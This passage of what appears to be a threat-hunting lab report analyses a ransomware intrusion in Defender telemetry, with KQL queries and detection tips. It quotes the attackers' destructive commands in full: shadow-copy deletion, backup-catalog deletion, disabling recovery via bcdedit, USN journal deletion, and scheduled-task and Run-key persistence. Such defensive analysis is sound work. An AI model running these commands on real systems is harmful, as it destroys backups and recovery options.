Monitor for execution of newly dropped binaries, especially those launched via remote execution tools. Treat such events as high-confidence malicious activity.

</details>

---
<details>
<summary id="-flag-16">🚩 <strong>Flag 16: IMPACT - Shadow Service Stopped</strong></summary>

### 🎯 Objective
Ransomware stops backup services to prevent recovery during encryption. Disable Volume Shadow Copy Service to prevent snapshot-based recovery.

### 📌 Finding
"net" stop VSS /y

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T06:04:53.2550438Z |
| Process | net.exe |
| Parent Process | cmd.exe |
| Command Line | net stop VSS /y |

### 💡 Why it matters
This aligns with Inhibit System Recovery (MITRE ATT&CK T1490). Stopping VSS removes a common recovery mechanism, significantly increasing ransomware effectiveness.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where FileName in ("net.exe","sc.exe","services.exe")
| where ProcessCommandLine has_any ("VSS","Shadow","Volume")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img  alt="image" src="https://github.com/user-attachments/assets/bacb9591-af7c-45cf-a1c7-b06dcb72bbcc" />



### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert immediately on VSS service stoppage, particularly when preceded by backup deletion or service disruption.

</details>

---
<details>
<summary id="-flag-17">🚩 <strong>Flag 17: IMPACT - Backup Engine Stopped</strong></summary>

### 🎯 Objective
Stop Windows backup services to prevent the creation or restoration of backups. 

### 📌 Finding
"net" stop wbengine /y

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T06:04:54.0244502Z |
| Process | net.exe |
| Parent Process | cmd.exe |
| Command Line | net stop wbengine /y |

### 💡 Why it matters
This aligns with Inhibit System Recovery (MITRE ATT&CK T1490). Stopping the Windows Backup Engine further ensures recovery options are eliminated.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where FileName in ("net.exe","sc.exe","services.exe")
| where ProcessCommandLine has "wbengine"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img  alt="image" src="https://github.com/user-attachments/assets/8a9e2230-d9e3-4df5-9074-67491cc9e4ab" />



### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for wbengine service stoppage and correlate with other recovery-inhibiting actions such as VSS manipulation or backup deletion.

</details>

---
<details>
<summary id="-flag-18">🚩 <strong>Flag 18: DEFENSE EVASION - Process Termination</strong></summary>

### 🎯 Objective
Terminate services that could interfere with encryption or lock files. Certain processes lock files and must be terminated before encryption can succeed.

### 📌 Finding
taskkill /F /IM sqlservr.exe

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T06:07:07.0199729Z |
| Process | taskkill.exe |
| Parent Process | cmd.exe |
| Command Line | taskkill /F /IM sqlservr.exe |

### 💡 Why it matters
This aligns with Process Termination (MITRE ATT&CK T1562.001 / T1489). Stopping database processes ensures files are unlocked and prevents application-level recovery during ransomware execution.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T05:55:00Z)..datetime(2025-11-25T06:10:00Z))
| where FileName == "taskkill.exe"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img  alt="image" src="https://github.com/user-attachments/assets/0d1e967c-96d5-4f1d-9b34-2c97e0604403" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert on forced termination of critical services such as databases or security tools, especially when clustered with other impact-stage activity.

</details>

---
<details>
<summary id="-flag-19">🚩 <strong>Flag 19: IMPACT - Recovery Point Deletion</strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding

"vssadmin" delete shadows /all /quiet

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T06:07:08.2198577Z |
| Process | vssadmin.exe |
| Parent Process | cmd.exe |
| Command Line | vssadmin delete shadows /all /quiet |

### 💡 Why it matters
This activity aligns with Inhibit System Recovery (MITRE ATT&CK T1490). Deleting Volume Shadow Copies removes one of the most common Windows recovery mechanisms, preventing rollback or file restoration after encryption. This is a well-known ransomware tactic and strongly indicates the attack has entered the irreversible impact phase.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where ProcessCommandLine has_any ("vssadmin","shadowcopy","wmic","net stop","sc stop","diskshadow","wbadmin","bcdedit","reagentc")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img  alt="image" src="https://github.com/user-attachments/assets/cdf148db-9bab-4d36-85a1-6f6a52df3498" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert immediately on vssadmin shadow deletion commands, especially when executed alongside backup deletion or service stoppage. These events should trigger emergency containment actions.

</details>

---
<details>
<summary id="-flag-20">🚩 <strong>Flag 20: IMPACT - Storage Limitation</strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-adminpc, azuki-sl |
| Timestamp | 2025-11-25T06:05:00.8701626Z |
| Process | vssadmin.exe |
| Parent Process | cmd.exe |
| Command Line | vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401mb |

### 💡 Why it matters
This activity aligns with Inhibit System Recovery (MITRE ATT&CK T1490). By drastically limiting shadow copy storage, the attacker ensures that new restore points cannot be created and existing ones may be deleted or overwritten. This weakens the organization’s ability to recover systems after encryption and is commonly used in ransomware attacks to guarantee recovery mechanisms remain unavailable even if backups attempt to run again.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where ProcessCommandLine has_any ("vssadmin","shadowcopy","wmic","net stop","sc stop","diskshadow","wbadmin","bcdedit","reagentc")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img  alt="image" src="https://github.com/user-attachments/assets/f7e1415f-c25d-43d1-8f56-ce32028dfed2" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert on vssadmin shadowstorage resize commands, especially when the maximum size is reduced to unusually small values. These actions are rarely legitimate and should be correlated with other recovery-inhibiting behavior such as shadow deletion, backup service stoppage, or catalog removal.

</details>

---
<details>
<summary id="-flag-21">🚩 <strong>Flag 21: IMPACT - Recovery Disabled</strong></summary>

### 🎯 Objective
Disable Windows recovery options permanently. Windows recovery features enable automatic system repair after corruption.

### 📌 Finding
"bcdedit" /set {default} recoveryenabled No

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-adminpc, azuki-sl  |
| Timestamp | 2025-11-25T06:04:59.5579336Z |
| Process | bcedit.exe |
| Parent Process | cmd.exe |
| Command Line | bcdedit /set {default} recoveryenabled No |

### 💡 Why it matters
This aligns with Inhibit System Recovery (MITRE ATT&CK T1490). Disabling recovery prevents systems from booting into repair or rollback modes, making post-incident remediation significantly more difficult.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where FileName == "bcdedit.exe"
| where ProcessCommandLine has "recoveryenabled"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img  alt="image" src="https://github.com/user-attachments/assets/e829d499-b48a-4da0-b25a-4a9ce2ee8914" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert on bcdedit commands modifying recovery settings, especially when combined with VSS or backup manipulation.

</details>

---
<details>
<summary id="-flag-22">🚩 <strong>Flag 22: IMPACT - Catalog Deletion</strong></summary>

### 🎯 Objective
Destroy backup metadata to prevent restoration. Backup catalogues track available restore points and backup versions.

### 📌 Finding

"wbadmin" delete catalog -quiet

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-adminpc |
| Timestamp | 2025-11-25T06:04:59.7181241Z |
| Process | wbadmin.exe |
| Parent Process | cmd.exe |
| Command Line | "wbadmin" delete catalog -quiet |

### 💡 Why it matters
This aligns with Inhibit System Recovery (MITRE ATT&CK T1490). Deleting the backup catalog removes the system’s ability to identify or restore backups, even if backup files still exist.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where FileName == "wbadmin.exe"
| where ProcessCommandLine has "delete catalog"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img alt="image" src="https://github.com/user-attachments/assets/1a76b0d2-b65e-4313-b5ea-342e36f0666b" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for wbadmin delete commands, which are rarely used legitimately and almost always indicate malicious recovery suppression.

</details>

---
<details>
<summary id="-flag-23">🚩 <strong>Flag 23: PERSISTENCE - Registry Autorun</strong></summary>

### 🎯 Objective
Registry keys can execute programs automatically at system startup. Establish persistence across reboots.

### 📌 Finding

WindowsSecurityHealth

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-adminpc |
| Timestamp | 2025-11-25T06:05:01.1151868Z |
| Process | powershell.exe |
| Parent Process | powershell.exe |
| RegistryValueName | WindowsSecurityHealth |
| RegistryValueData | C:\Windows\Temp\cache\silentlynx.exe |

### 💡 Why it matters
This activity aligns with Boot or Logon Autostart Execution: Registry Run Keys (MITRE ATT&CK T1547.001). By creating a registry autorun entry that masquerades as a legitimate Windows component (WindowsSecurityHealth), the attacker ensures their payload will execute on every logon while blending into normal system behavior. This allows the attacker to maintain access and re-establish execution even after reboots or partial remediation.

### 🔧 KQL Query Used
```
DeviceRegistryEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where RegistryKey has @"\Run"
| project TimeGenerated, DeviceName, RegistryValueName, RegistryValueData
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img  alt="image" src="https://github.com/user-attachments/assets/828bc493-60d9-4270-8b4f-af0188c5b107" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for new or modified registry Run-key entries that reference executables in temporary or user-writable directories such as C:\Windows\Temp. Prioritize investigation when autorun values impersonate legitimate Windows services or security components, as this is a common persistence technique used by ransomware operators.

</details>

---
<details>
<summary id="-flag-24">🚩 <strong>Flag 24: PERSISTENCE - Scheduled Execution</strong></summary>

### 🎯 Objective
Scheduled jobs provide reliable persistence with configurable triggers. Ensure malicious payload executes on user logon with elevated privileges.

### 📌 Finding
"schtasks" /create /tn "Microsoft\Windows\Security\SecurityHealthService" /tr "C:\Windows\Temp\cache\silentlynx.exe" /sc onlogon /rl highest /f

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T06:05:01.1297501Z |
| Process | schtasks.exe |
| Parent Process | cmd.exe |
| Command Line | "schtasks" /create /tn "Microsoft\Windows\Security\SecurityHealthService" /tr "C:\Windows\Temp\cache\silentlynx.exe" /sc onlogon /rl highest /f |

### 💡 Why it matters
This aligns with Scheduled Task/Job (MITRE ATT&CK T1053.005). Creating a scheduled task provides reliable persistence and execution with high privileges, commonly used by ransomware families.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where ProcessCommandLine has @"Microsoft\Windows\Security\SecurityHealthService"
| project TimeGenerated, DeviceName, ProcessCommandLine
```

### 🖼️ Screenshot
<img  alt="image" src="https://github.com/user-attachments/assets/57651e1f-f260-4b67-9b1a-28f7f8594fde" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert on scheduled task creation pointing to unsigned binaries or temp locations, especially when tasks masquerade as Windows services.

</details>

---
<details>
<summary id="-flag-25">🚩 <strong>Flag 25: DEFENSE EVASION - Journal Deletion</strong></summary>

### 🎯 Objective
Remove forensic artifacts and hinder recovery. File system journals track changes and are valuable for forensic analysis.

### 📌 Finding
"fsutil.exe" usn deletejournal /D C:

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T06:10:04.9145097Z |
| Process | fsutil.exe |
| Parent Process | cmd.exe |
| Command Line | "fsutil.exe" usn deletejournal /D C: |

### 💡 Why it matters
This activity aligns with Indicator Removal on Host (MITRE ATT&CK T1070). Deleting the USN journal removes a key forensic data source used to track file creation, modification, and deletion. This hinders post-incident investigation, obscures attacker activity, and complicates recovery analysis. In ransomware intrusions, journal deletion is commonly used to reduce defender visibility after impact actions have begun.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where FileName == "fsutil.exe"
| where ProcessCommandLine has "deletejournal"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img alt="image" src="https://github.com/user-attachments/assets/75e03ffc-00e5-4c5d-9d53-3823ad8a5846" />



### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert on fsutil commands that delete the USN journal, as this action is rarely required during normal operations. Treat journal deletion as a high-confidence defense evasion indicator, especially when observed alongside backup destruction, recovery suppression, or service termination activity.

</details>

---

<details>
<summary id="-flag-26">🚩 <strong>Flag 26: IMPACT - Ransom Note</strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
SILENTLYNX_README.txt

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-adminpc, azuki-sl |
| Timestamp | 2025-11-25T06:05:01.1043756Z |
| ActionType | FileCreated |
| FileName | SILENTLYNX_README.txt |
| FolderPath | C:\Users\yuki.tanaka\Desktop\ (also Documents\, multiple hosts) |
| Process | silentlynx.exe |
| Parent Process | silentlynx.exe |
| Command Line | silentlynx.exe |

### 💡 Why it matters
This activity aligns with Data Encrypted for Impact (MITRE ATT&CK T1486). The creation of a ransom note confirms that the attacker has completed the primary destructive actions and is transitioning to extortion. At this stage, recovery options have already been intentionally degraded or eliminated, and the attacker’s goal is no longer access or disruption but coercion. Detection here indicates the attack has reached its terminal phase.

### 🔧 KQL Query Used
```
DeviceFileEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-20T00:00:00Z)..datetime(2025-12-04T23:59:59Z))
| where FileName endswith ".txt"
| project TimeGenerated, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFileName
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img  alt="image" src="https://github.com/user-attachments/assets/f3220ee1-3545-4329-a1a1-bd1479159940" />



### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for the creation of ransom note files (e.g., *_README.txt) across multiple directories and endpoints within a short timeframe. Correlate file creation with suspicious process execution, encryption activity, and recovery-inhibiting behavior. Treat widespread ransom note creation as a confirmed ransomware incident requiring immediate incident response and containment.

</details>
<!-- Duplicate Flag 1 section for Flags 2–20 -->

---

## 🚨 Detection Gaps & Recommendations

### Observed Gaps
- Limited detection of credential misuse and lateral movement: The attacker was able to authenticate and move laterally using valid credentials without triggering early alerts, indicating insufficient monitoring of privileged account usage and internal SSH/remote execution activity.
- Insufficient visibility into backup infrastructure activity: Multiple discovery and destructive actions against backup systems (enumeration, deletion, service stoppage) occurred without effective prevention, highlighting weak controls around critical recovery assets.
- Delayed detection of impact-stage behavior: Several high-confidence ransomware indicators (backup deletion, recovery suppression, service termination) were only observable after significant damage had already occurred, reducing the opportunity for effective response.

### Recommendations
- Strengthen monitoring of privileged accounts and internal remote access: Implement alerting for interactive use of administrative and backup-related accounts, especially when originating from user workstations or accessing sensitive infrastructure.
- Harden and isolate backup and recovery systems: Restrict interactive access to backup servers, enforce immutable backups where possible, and closely monitor for destructive commands targeting backup directories, services, and recovery mechanisms.
- Improve correlation and escalation for ransomware precursors: Prioritize alerts that chain lateral movement, discovery, tool transfer, and recovery suppression activity, enabling faster SOC escalation before impact actions are completed.

---

## 🧾 Final Assessment

The Azuki incident represents a deliberate, end-to-end ransomware operation, not an opportunistic intrusion. Analysis of Microsoft Defender for Endpoint telemetry shows the attackers already possessed valid credentials and leveraged trusted administrative tooling to move laterally from a compromised workstation into the organization’s backup infrastructure. From there, they conducted targeted reconnaissance to identify backup locations, recovery mechanisms, and privileged services before executing coordinated impact actions.

Once inside the backup environment, the attackers systematically eliminated recovery options. Backup directories were enumerated and deleted, backup and scheduling services were stopped and disabled, Volume Shadow Copies were deleted and constrained, and Windows recovery features were explicitly turned off. These actions ensured that even partial restoration attempts would fail. The use of native system utilities (rm, vssadmin, wbadmin, bcdedit, fsutil) allowed the attackers to blend into normal administrative activity while achieving irreversible damage.

Ransomware deployment and propagation were accelerated through remote execution tooling and credential reuse, enabling the payload to be distributed across multiple systems in rapid succession. The creation of ransom notes on all affected hosts confirms that encryption and extortion were the final objectives, executed only after recovery mechanisms had been neutralized. At this stage, defender options were limited to containment and incident response rather than prevention.

In summary, the attackers reached the backup infrastructure through credential-based lateral movement, destroyed both data and recovery capabilities in a calculated sequence, and spread ransomware quickly using legitimate administrative tools. While endpoint telemetry captured each stage of the attack, detection occurred largely after the attackers had achieved strategic objectives, leaving the organization with minimal recovery options. This incident highlights the critical need for earlier detection of credential misuse, stricter controls around backup systems, and faster SOC escalation when pre-impact ransomware behaviors are observed.

---

## 📎 Analyst Notes

- This report was structured to mirror a real SOC threat-hunting investigation, with each flag representing a distinct attacker behavior observed in Microsoft Defender for Endpoint telemetry.
- All findings are evidence-based and reproducible using Microsoft Defender Advanced Hunting queries included in the report. No assumptions were made beyond what is supported by logged activity.
- The investigation emphasizes attacker progression and intent over isolated alerts, demonstrating how individual low-signal events chain together into a full ransomware kill chain.
- MITRE ATT&CK mappings are included to contextualize behaviors within a standard framework, but conclusions are driven by observed activity rather than framework alignment alone.
- This report is intended for technical review and interview discussion, highlighting investigative reasoning, tradecraft recognition, and detection gaps rather than tool-specific alerting. 

---
